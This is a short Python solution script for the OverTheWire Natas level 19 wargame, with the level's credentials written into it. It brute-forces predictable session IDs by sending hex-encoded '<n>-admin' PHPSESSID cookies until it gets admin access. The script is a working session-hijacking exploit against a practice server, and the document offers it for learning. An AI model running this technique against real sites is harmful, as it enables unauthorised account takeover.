PHPSESSID

```
#!/usr/bin/env python
import requests
import binascii

username = 'natas19'
password = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'

url = 'http://%s.natas.labs.overthewire.org' % username

for i in range(641):
    session = requests.Session()
    
    # Encode PHPSESSID as hexadecimal
    phpsessid_value = "%d-admin" % i
    phpsessid_hex = binascii.hexlify(phpsessid_value.encode('utf-8')).decode('utf-8')

    # Send GET request with encoded PHPSESSID cookie
    response = session.get(url, cookies={"PHPSESSID": phpsessid_hex}, auth=(username, password))
    content = response.text

    # Check if "You are an admin" is in the response text
    if "You are an admin" in content:
        print(f"Got it! PHPSESSID={phpsessid_value}")
        print(content)  # Print the content of the response
        break
    else:
    	print(phpsessid_hex)

```
